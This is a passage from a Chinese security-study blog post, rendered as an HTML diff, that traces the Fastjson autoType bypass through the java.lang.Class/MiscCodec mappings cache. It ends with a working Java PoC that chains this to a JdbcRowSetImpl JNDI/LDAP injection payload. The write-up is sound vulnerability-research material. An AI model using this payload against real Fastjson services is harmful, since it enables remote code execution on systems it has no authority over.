data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710760060376-bdf8330e-2449-4951-b49e-c595dded31f7.png#averageHue=%23373c44&clientId=u59ce0523-5c63-4&from=paste&height=203&id=u6c15d57f&originHeight=380&originWidth=867&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=69811&status=done&style=none&taskId=u64217b73-a7e6-4c70-ac7f-50dc1471c5d&title=&width=462.4" referrerpolicy="no-referrer" alt="image.png"><br>也就是说 loadClass 会在最后尝试向 mappings 中写入当前正在实例化的类,那我们只需要能够控制到 loadClass 的参数,往里传入我们想要实例化的类即可<br>首先,<code>TypeUtils</code> 中有重载三个 loadClass 方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710760474254-1311a315-63f9-47d4-8f0a-1d4002a83c3e.png#averageHue=%23383e47&clientId=u59ce0523-5c63-4&from=paste&height=48&id=u8ca70845&originHeight=90&originWidth=1430&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=53585&status=done&style=none&taskId=uc7d665e1-7755-4daa-8749-8765d74b860&title=&width=762.6666666666666" referrerpolicy="no-referrer" alt="image.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710760493308-8e775bcc-acd5-4711-a423-fb48f1c0eacf.png#averageHue=%23373d46&clientId=u59ce0523-5c63-4&from=paste&height=121&id=u90286091&originHeight=226&originWidth=1324&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=124476&status=done&style=none&taskId=uc927103c-4b5a-44af-9444-d3870ee45cc&title=&width=706.1333333333333" referrerpolicy="no-referrer" alt="image.png"><br>虽然最终都会往三个参数的 loadClass 走(也就是我们刚才分析的 loadClass),但是每个 loadClass 被调用的地方都是不同的<br>但是可以明确一点,三个 loadClass 的 String Class 参数是一定会有的,其他参数可有可无,也就是说我们只要找到能够后续调用,且参数可控的部分,就能够形成利用链<br>找一下双参数的 loadClass 在哪被调用了<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710760691314-1fa70a38-c908-48fe-ac1e-3e0aa0ac7a45.png#averageHue=%2339404b&clientId=u59ce0523-5c63-4&from=paste&height=249&id=uc234f505&originHeight=467&originWidth=1186&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=239267&status=done&style=none&taskId=uec4f3ca6-c6ac-4bd7-8257-09d37f97287&title=&width=632.5333333333333" referrerpolicy="no-referrer" alt="image.png"><br>跟进到<code>com.alibaba.fastjson.serializer.MiscCodec</code>的具体调用部分<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710760841884-af26ac13-066f-497b-ac59-767ad8e6b7be.png#averageHue=%23373f48&clientId=u59ce0523-5c63-4&from=paste&height=68&id=u0627c15c&originHeight=127&originWidth=1422&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=59741&status=done&style=none&taskId=u5c78e354-8374-4f62-8d81-20597b2fe87&title=&width=758.4" referrerpolicy="no-referrer" alt="image.png"><br>需要的是 strVal 参数来指定为我们想要加载的类,来看 strVal 参数如何控制<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710760926332-46eac8c6-36a5-4f16-96e3-5691535d4ab3.png#averageHue=%23373e48&clientId=u59ce0523-5c63-4&from=paste&height=108&id=ufa36e546&originHeight=202&originWidth=927&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=47683&status=done&style=none&taskId=u4f78ae44-ddd3-4a55-a29e-92992dd0b1d&title=&width=494.4" referrerpolicy="no-referrer" alt="image.png"><br>这里想要赋值 strVal 就必须使得 objVal 不为空,且为我们的目标<br>看一下 objVal 是如何赋值的<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710760999342-c90429aa-b02d-4c3c-90ef-1afe00695287.png#averageHue=%23373c45&clientId=u59ce0523-5c63-4&from=paste&height=428&id=u59347f96&originHeight=802&originWidth=1097&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=256174&status=done&style=none&taskId=uebd4de35-a58e-48d2-9229-ff7799a345e&title=&width=585.0666666666667" referrerpolicy="no-referrer" alt="image.png"><br>当<code>parser.resolveStatus</code> 为<code>TypeNameRedirect</code>时,会进入 if 判断,然后通过扫描器判断 json 字符串中 val 键是否符合要求,然后将 val 中值通过 parser 的解析器方法返回给 objVal<br>resolveStatus 如何变为TypeNameRedirect 呢?<br>我们可以尝试一下 POC 的 payload</p>
-<pre><code class="java">&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;aaaaa&quot;&#125;
-</code></pre>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">&#123;</span><span class="token string">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span><span class="token string">"val"</span><span class="token operator">:</span><span class="token string">"aaaaa"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>后续直接跟进到 checkAutoType 中,我们来到第二个 if 判断,也就是直通过 deserializer 去 findClass<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710761805704-8a2b0430-2c05-461f-aa97-bacf3b55051c.png#averageHue=%23555a6c&clientId=u59ce0523-5c63-4&from=paste&height=76&id=u13405a69&originHeight=142&originWidth=1823&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=85562&status=done&style=none&taskId=u51c04b9d-4220-43b9-aada-de0ffc73dcc&title=&width=972.2666666666667" referrerpolicy="no-referrer" alt="image.png"><br>实际上就是从<code>IdentityHashMap</code>中取值,由于 parserConfig 在初始化的时候会调用 initDeserializer 方法去初始化 deserializer<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710762229343-02ff32a1-3dc5-47e0-81ba-5bb09840a606.png#averageHue=%23373c45&clientId=u59ce0523-5c63-4&from=paste&height=466&id=u65ddbd94&originHeight=874&originWidth=1310&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=395803&status=done&style=none&taskId=u6de650b3-0247-4ed0-bcc8-7b8122b28c6&title=&width=698.6666666666666" referrerpolicy="no-referrer" alt="image.png"><br>而在 deserializer 的初始化方法中,已经将 Class.class 加载了<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710762194669-244b4ccd-acda-4b65-b217-3c2ee3796258.png#averageHue=%23383d46&clientId=u59ce0523-5c63-4&from=paste&height=500&id=ufbd4272d&originHeight=937&originWidth=1227&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=544264&status=done&style=none&taskId=ub8ae00f8-6f7c-4777-b022-a15045fe3e9&title=&width=654.4" referrerpolicy="no-referrer" alt="image.png"><br>所以我们此时的 deserializer 能从中 find 到 clazz,并且在后续的 parseObject 方法中会将<code>resolveStatus</code>设置为<code>TypeNameRedirect</code><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710762431316-b3140e70-a5f1-454c-81e2-8c3f41266476.png#averageHue=%2339404c&clientId=u59ce0523-5c63-4&from=paste&height=44&id=u28aa8fc4&originHeight=82&originWidth=1252&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=26844&status=done&style=none&taskId=u82b0f034-d698-4f82-8e2f-e8342cf6629&title=&width=667.7333333333333" referrerpolicy="no-referrer" alt="image.png"><br>那么此时的条件都已经达成了:<code>resolveStatus</code>设置为<code>TypeNameRedirect</code>,我们能够通过自控 objval 去设置 strval,然后通过 loadClass 去加载 strval,并且写入 mappings 缓存<br>POC 如下:</p>
-<pre><code class="java">import com.alibaba.fastjson.JSON;
-import com.alibaba.fastjson.parser.Feature;
-import com.alibaba.fastjson.parser.ParserConfig;
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">Feature</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">ParserConfig</span></span><span class="token punctuation">;</span>
 
 
-public class FastJson_JNDI_LDAP &#123;
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FastJson_JNDI_LDAP</span> <span class="token punctuation">&#123;</span>
 
-    public static void main(String[] args) &#123;
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
 
-        String payload=&quot;&#123;\&quot;a\&quot;:&quot; +
-                &quot;&#123;\&quot;@type\&quot;: \&quot;java.lang.Class\&quot;,\&quot;val\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,&quot; +
-                &quot;\&quot;stoocea\&quot;:&quot; +
-                &quot;&#123;\&quot;@type\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,&quot; +
-                &quot;\&quot;dataSourceName\&quot;: \&quot;ldap://127.0.0.1:10389/cn=TestLdap,dc=example,dc=com\&quot;,&quot; +
-                &quot;\&quot;autoCommit\&quot;: true&#125;&quot; +
-                &quot;&#125;&quot;;
+        <span class="token class-name">String</span> payload<span class="token operator">=</span><span class="token string">"&#123;\"a\":"</span> <span class="token operator">+</span>
+                <span class="token string">"&#123;\"@type\": \"java.lang.Class\",\"val\": \"com.sun.rowset.JdbcRowSetImpl\"&#125;,"</span> <span class="token operator">+</span>
+                <span class="token string">"\"stoocea\":"</span> <span class="token operator">+</span>
+                <span class="token string">"&#123;\"@type\": \"com.sun.rowset.JdbcRowSetImpl\","</span> <span class="token operator">+</span>
+                <span class="token string">"\"dataSourceName\": \"ldap://127.0.0.1:10389/cn=TestLdap,dc=example,dc=com\","</span> <span class="token operator">+</span>
+                <span class="token string">"\"autoCommit\": true&#125;"</span> <span class="token operator">+</span>
+                <span class="token string">"&#125;"</span><span class="token punctuation">;</span>
 
-        JSON.parseObject(payload);
+        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-    &#125;
+    <span class="token punctuation">&#125;</span>
 
-&#125;
-</code></pre>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>我个人的 FastJson 复习和学习暂时停在这里,后续还有其他的内容会继续补充到我这篇笔记性质的博客</p>
 </article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/03/08/65ea7ca64ea9f.png" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/03/08/65ea7ca64ea9f.png" title="头像" alt="头像"></a><div class="post-copyright__author_name">stoocea</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://example.com/post/FastJsonRe0.html">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://example.com/post/FastJsonRe0.html')">FastJsonRe0</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://example.com/post/FastJsonRe0.html"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=FastJsonRe0&amp;url=http://example.com/post/FastJsonRe0.html&amp;pic=https://bu.dusays.com/2024/03/11/65ee76f777226.jpg" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
   var currentPageUrl = window.location.href;
